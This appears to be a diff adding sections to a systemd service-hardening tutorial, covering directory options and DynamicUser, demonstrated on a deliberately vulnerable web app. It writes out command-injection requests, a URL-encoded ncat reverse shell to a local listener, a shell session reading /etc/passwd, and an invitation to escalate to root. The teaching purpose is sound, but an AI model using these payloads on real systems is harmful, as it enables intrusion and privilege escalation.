@@ -733,3 +733,150 @@ You will notice that the tool can not see any file in those directories.
   $ curl  http://localhost:8000/exec/ls%20%2Ftmp
 
 
+Fixing directory paths
+-----------------------
+
+systemd also provides various sandboxing options for runtime/configuration/state/logging directories for any service, and those are available to the service as
+environment variables too.
+You can specify them via the following options:
+
+.. list-table:: Directory configuration
+  :header-rows: 1
+
+  * - Directory
+    - Path for system units
+    - Environment variable
+
+  * - RuntimeDirectory=
+    - /run/
+    - $RUNTIME_DIRECTORY
+  * - StateDirectory=
+    - /var/lib/
+    - $STATE_DIRECTORY
+  * - CacheDirectory=
+    - /var/cacche/
+    - $CACHE_DIRECTORY
+
+  * - LogsDirectory=
+    - /var/logs/
+    - $LOGS_DIRECTORY
+  * - ConfigurationDirectory=
+    - /etc/
+    - $CONFIGURATION_DIRECTORY
+
+
+DynamicUser
+-----------
+
+This is a very powerful option, takes a boolean value. If set to `yes` a user &
+group will be dynamically added. This value will not be showed up in the
+`/etc/passwd` or in `/etc/group` files. It also means `ProtectSystem=strict` &
+`ProtectHome=read-only`. `PrivateTmp` is also implied. Two new options will also
+be implied,  `NoNewPrivileges=` and `RestrictSUIDSGID=`. These options make sure
+the actual service process can not create SUID/SGID files or use them.
+
+Let us enable DynamicUser and have a state directory and move us to that StateDirectory as WorkingDirectory.
+
+
+.. code-block:: ini
+
+  [Unit]
+  Description=Very Bad Web Application
+  After=network.target
+
+  [Service]
+  Type=simple
+  ExecStart=/usr/sbin/verybad
+  Restart=always
+  DynamicUser=yes
+  StateDirectory=verybad
+  WorkingDirectory=/var/lib/verybad
+
+  [Install]
+  WantedBy=multi-user.target
+
+
+The StateDirectory is now `/var/lib/verybad`, but because we are having a
+DynamicUser, it is actually under `/var/lib/private` and symlinked to
+`/var/lib/verybad`. We can see if we check the index page once again.
+
+
+::
+
+  $ curl http://localhost:8000/
+  Example of poorly written code.
+      GET /getos -> will give the details of the OS.
+      GET /filename -> will provide a file from the current directory
+      GET /exec/date -> will give you the current date & time in the server.
+      POST /filename -> Saves the data in filename.
+      Code is running in: /var/lib/private/verybad
+
+
+We can also check details about the `user` the service is running as and try to write to some files or execute commands or read some files.
+
+::
+
+  $ curl http://localhost:8000/exec/id
+  uid=65445(verybad) gid=65445(verybad) groups=65445(verybad) context=system_u:system_r:unconfined_service_t:s0
+  $ curl -d '42 is the answer.'  http://localhost:8000/%2Fvar%2Flib%2Fverybad%2Fexample
+  Okay
+  $ curl http://localhost:8000/%2Fvar%2Flib%2Fverybad%2Fexample
+  42 is the answer.
+
+We can still create a reverse shell in this setup. In one terminal use `nc` to listen for connection on port 5555 and use `ncat` command to connect to it.
+
+::
+
+  $ nc -nlv 5555
+  Listening on 0.0.0.0 5555
+
+Now, use `curl` to fire up `ncat` & connect to this. We have the command `ncat 127.0.0.1 5555 -e /bin/bash` URL encoded.
+
+::
+
+  $ curl http://localhost:8000/exec/ncat%20127.0.0.1%205555%20-e%20%2Fbin%2Fbash
+
+
+Now, if you go back you can see a connection has been established.
+
+::
+
+  Connection received on 127.0.0.1 54056
+  id
+  uid=65445(verybad) gid=65445(verybad) groups=65445(verybad) context=system_u:system_r:unconfined_service_t:s0
+  pwd
+  /var/lib/private/verybad
+  ls /tmp
+  cp /usr/bin/ls /tmp/
+  ls -l /tmp/ls
+  -rwxr-xr-x. 1 verybad verybad 141816 Mar 30 09:41 /tmp/ls
+  chmod u+s /tmp/ls
+  ls -l /tmp/ls
+  -rwxr-xr-x. 1 verybad verybad 141816 Mar 30 09:41 /tmp/ls
+  cat /etc/passwd
+  root:x:0:0:root:/root:/bin/bash
+  bin:x:1:1:bin:/bin:/sbin/nologin
+  daemon:x:2:2:daemon:/sbin:/sbin/nologin
+  adm:x:3:4:adm:/var/adm:/sbin/nologin
+  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+  sync:x:5:0:sync:/sbin:/bin/sync
+  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+  halt:x:7:0:halt:/sbin:/sbin/halt
+  mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+  operator:x:11:0:operator:/root:/sbin/nologin
+  games:x:12:100:games:/usr/games:/sbin/nologin
+  ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+  nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+  dbus:x:81:81:System message bus:/:/sbin/nologin
+  systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
+  systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+  systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
+  systemd-timesync:x:998:998:systemd Time Synchronization:/:/usr/sbin/nologin
+  systemd-coredump:x:997:997:systemd Core Dumper:/:/usr/sbin/nologin
+  tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+  unbound:x:996:995:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+  sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+  chrony:x:995:994::/var/lib/chrony:/sbin/nologin
+  fedora:x:1000:1000:fedora Cloud User:/home/fedora:/bin/bash
+
+See if you can esclate to `root` from this shell :)
